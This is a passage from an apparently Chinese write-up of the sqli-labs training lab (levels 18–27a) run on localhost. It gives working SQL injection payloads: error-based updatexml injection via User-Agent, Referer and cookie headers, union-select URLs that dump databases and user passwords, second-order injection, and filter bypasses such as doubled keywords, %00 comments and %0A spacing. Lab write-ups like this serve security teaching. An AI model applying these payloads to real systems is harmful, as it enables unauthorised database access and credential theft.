<p> User-Agent  ‘ or updatexml(1,concat(0x7e,database()),1) ,’ ‘,’ ‘)#</p>
<p><img src="https://img-blog.csdnimg.cn/eebdeedf7d1348a58e0aff92c0a7928e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 发现可以爆出当前的数据库名,之后爆表，爆字段了</p>
<p><img src="https://img-blog.csdnimg.cn/8cbc6ce8c0bb4ff3864abcba5345297b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h1><p>登录成功，回显ip和Referer信息 </p>
<p><img src="https://img-blog.csdnimg.cn/1efc177a1c0f407cb84af618cc901b74.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/0d2b60fdc34b46f6a0ee8f58bcb73d20.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>之后与less-18相同，通过插件修改Referer信息。</p>
<p>‘ or updatexml(1,concat(0x7e,database()),1) ,’ ‘)# </p>
<p><img src="https://img-blog.csdnimg.cn/52069de750e14e05b35d7d85d653c77b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>成功爆库</p>
<p><img src="https://img-blog.csdnimg.cn/c110423c33a84049a7d4f2d87ec0f21c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h1><p>先用admin登录 可以看到Cookie信息</p>
<p>分析代码，发现使用我们的cookie进行了数据库的查询，尝试从这里入手</p>
<p><img src="https://img-blog.csdnimg.cn/74efdbc7b2024d71b741288df366fca8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>使用火狐插件修改Cookie</p>
<p><img src="https://img-blog.csdnimg.cn/410eb955af52488da484b5ca7a7c0b7b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 在admin 后加上 ‘ ，保存再刷新页面（F5）</p>
<p><img src="https://img-blog.csdnimg.cn/bd0d699d3aac4c90bc648996aa3cf614.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 在单引号后加上注解 #，保存刷新，发现成功显示Cookie</p>
<p><img src="https://img-blog.csdnimg.cn/40fbc50e40a44710b50aca3dd3bec0fb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>可以报错注入，也可以通过回显爆信息</p>
<p><img src="https://img-blog.csdnimg.cn/21181a47c4bb4e5292f41e81436ac63e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>通过回显爆信息</p>
<p>通过order by 得知有三列</p>
<p>我们让查询失败（-admin），同时查看我们的占位符<br> 123的位置 </p>
<p><img src="https://img-blog.csdnimg.cn/2e778246afbd4b8cae6ee28831efded2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>接下来就是爆！</p>
<p><img src="https://img-blog.csdnimg.cn/aa69b2e301cf4ff1b258fda87c8d1751.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><p>先登录，查看sql语句，发现是 ‘) 这样的闭合方式</p>
<p><img src="https://img-blog.csdnimg.cn/19bb8531a23c4af2855a6208a21de1cb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>21关同样显示了我们的Cookie信息，从这里入手</p>
<p>但是发现 uname 的值不再是admin，而是变成了base64编码的</p>
<p><img src="https://img-blog.csdnimg.cn/ecf42d20c67c43e9a72bc9a674a8766f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>解码（%3D 是 等于号 =）</p>
<p><img src="https://img-blog.csdnimg.cn/9771c8ef6a7549cea0afeb4a35762146.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"> 我们将自己的语句加密即可</p>
<p> <img src="https://img-blog.csdnimg.cn/e925666321e64e11a50a893ea70cb24d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 复制，回显成功</p>
<p><img src="https://img-blog.csdnimg.cn/9f05cf7a57d8408698d4e759a6524a7d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>爆库</p>
<p><img src="https://img-blog.csdnimg.cn/31497795f2da46ccaa2752775aac9b1c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><p>双引号 “ 闭合</p>
<p><img src="https://img-blog.csdnimg.cn/dd1bbdde01224b9bb728d6de29d01920.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>之后与21关相同。 </p>
<h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>加上单引号后报错，说明可能存在注入</p>
<p><img src="https://img-blog.csdnimg.cn/1f2cc1b4d6e04466a01dbd08603d52ee.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>尝试注释 发现并不能注解之后的单引号</p>
<p><img src="https://img-blog.csdnimg.cn/3ccf39514f1e49349eee5181a4fcf588.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>其实通过审计代码后发现 –+ 和 # 都被转义为了空格</p>
<p><img src="https://img-blog.csdnimg.cn/2ded14cbb1d5424ca733d1e6feed2e7e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>由于我们没法注解后面的单引号，所以我们可以根据mysql解析顺序做一些尝试</p>
<p><a href="http://127.0.0.1/sqli-labs/Less-23/?id=1&#39;">http://127.0.0.1/sqli-labs/Less-23/?id=1&#39;</a> or ‘1’=’1‘ order by 100 and ‘1’=’1</p>
<p>id=1’ or ‘1’=’1‘ order by 100 and ‘1’=’1’ 分析一下 id=1 执行成功 or之后 执行了 ‘1’=’1’ </p>
<p>它忽略掉了order by 100 这个语句</p>
<p>这个语句我们发现登录成功了，并且不能通过order by 判断列数</p>
<p><img src="https://img-blog.csdnimg.cn/39e599f7a2e948e996560e63c5f67e67.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 但是我们可以通过 union select 1,2,3,4 猜测列数</p>
<p>到4的时候报错，说明有三列 </p>
<p><img src="https://img-blog.csdnimg.cn/a4345d9858e741019c0cbdfdd352a41b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 使查询报错，回显占位符的位置 我们可以去掉 id 后边的or 或者改成 and </p>
<p>因为 这里使用的 or或and 作为了联合查询第二语句的条件而不是第一个语句where的条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-23/?id=-1&#x27;  &#x27;1&#x27;=&#x27;1&#x27; union select 1,2,3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs/Less-23/?id=-1&#x27; and  &#x27;1&#x27;=&#x27;1&#x27; union select 1,2,3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/ba304f16597a4ab8baea62ae6cfb231b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>爆表</p>
<h2 id="-3"><a href="#-3" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/8c02474fd9ab429eb86275e9246fdc8d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></h2><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>我们可以使用另一种特殊的注释符 ;%00 </p>
<p><img src="https://img-blog.csdnimg.cn/d48571e982df46019033573e43907266.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 通过order by 得知有三列</p>
<p>是查询报错，回显我们的占位符的位置，之后就可以进行爆库，爆表了 </p>
<p><img src="https://img-blog.csdnimg.cn/1a3422d2beda4852b3104fd96890efc1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 库</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-23/?id=-1 &#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata;%00</span><br><span class="line">// 表</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-23/?id=-1 &#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 ;%00</span><br><span class="line">// 字段</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-23/?id=-1 &#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ;%00</span><br><span class="line">// 值</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-23/?id=-1 &#x27; union select 1,2,group_concat(concat(username,0x7e,password)) from security.users ;%00</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="-4"><a href="#-4" class="headerlink" title></a></h2><h1 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h1><p>在windows下解压的时候可能会遇到文件名相同的问题，导致我们less-24关的代码不完整。我们需要从sqli-labs的压缩包中，补全我们24关的代码且修改部分文件的名字。（属实坑人）</p>
<p><img src="https://img-blog.csdnimg.cn/be53c960ab26421fbe573a4280a32f54.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>本关属于二次注入（原理自行百度）</p>
<p><img src="https://img-blog.csdnimg.cn/e857a9127ebc43baad2f61db3f5218a2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们注册一个admin ‘# 虽然他是转义了，但是仍然在数据库中仍然存好了，<br> $sql = “UPDATE users SET PASSWORD=’$pass’ where username=’admin ‘#’ and password=’$curr_pass’ “;<br> 这里查询了username=admin，同时注释了后面的语句<br> 那么我们直接修改密码即可，也就相当于修改了admin的密码 </p>
<h1 id="-5"><a href="#-5" class="headerlink" title></a></h1><h1 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h1><p>我们发现 or and 被过滤了</p>
<p><img src="https://img-blog.csdnimg.cn/31843c53be414c9eb7367cef2309c0f8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 所以我们双写 or 和 and 即可，双写后登录成功</p>
<p><img src="https://img-blog.csdnimg.cn/b69557a1d89a448f974024b83c527bef.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>进行注入</p>
<p><img src="https://img-blog.csdnimg.cn/c84af847c5754db789f2df18132fd41d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>过滤 or 和 and 的语句 </p>
<p><img src="https://img-blog.csdnimg.cn/481cc69185fe4638b164dbc8027217f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>我们发现 期望参数是 1 ，参数1 不应该被单引号包裹 </p>
<p><img src="https://img-blog.csdnimg.cn/3bf20c8219004cc6b5c159115e4c8293.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>测试 ，发现or 和 and 被过滤 双写即可，且参数不用单引号包裹 便可以直接注入</p>
<p><img src="https://img-blog.csdnimg.cn/b10de3a163214f6cafe638a2a5893125.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h1><p><img src="https://img-blog.csdnimg.cn/736851c410b944089cb2e2a5fd99d6ec.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们发现空格被滤过了 ，我们可以不考虑空格</p>
<p>所以我们采用报错注入（语句无中没有空格）同时可以使用 || 代替 or</p>
<p>可以使用（）包裹语句 避免了空格的使用</p>
<p><img src="https://img-blog.csdnimg.cn/5616ca9bbac243edbac7c3f6a7566d1e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前数据库</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-26/?id=-1&#x27; || updatexml(1,concat(0x7e,database()),1)  || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/9aac4e7306024f5d96f03b00ff168b57.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据ID获取账号密码</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-26/?id=-1&#x27; || updatexml(1,concat(0x7e,       (select(group_concat(concat_ws(0x7e,username,passwoorrd)))  from (security.users) where (id=1) )       ),1)  || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/cca96fd7dc0e4a49898b675d2b201517.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="-6"><a href="#-6" class="headerlink" title></a></h2><p>在26关对很多东西都过滤了</p>
<p><img src="https://img-blog.csdnimg.cn/ceff00e20c3748b0aa4055336ba7d716.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h1><p>单引号加括号闭合</p>
<p><img src="https://img-blog.csdnimg.cn/4239192b469a40d8b555ff0648517790.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 关闭了报错，但是盲注仍然可以找出来，使用’)即可</p>
<p>其余与上一关一致</p>
<h1 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h1><p>测试双引号不报错，而单引号报错存在注入漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/46e08906141443e2b35837af33ac497c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 测试可得 union select 被过滤了，可以采取大小写绕过</p>
<p>测试发现 %0A可以当空格使用（脚本测试：注意url的闭合条件） </p>
<p><img src="https://img-blog.csdnimg.cn/80149ad1befb426cab52e9cec9d85d5e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/882cde3476224f1ca6c6eec0f5a92993.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/7444721e9bce4950a25af94db584cbcf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>可以采用报错注入 </p>
<p><img src="https://img-blog.csdnimg.cn/334d772f4b38466f96753438a92b4c55.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h1><p>测试，双引号闭合 </p>
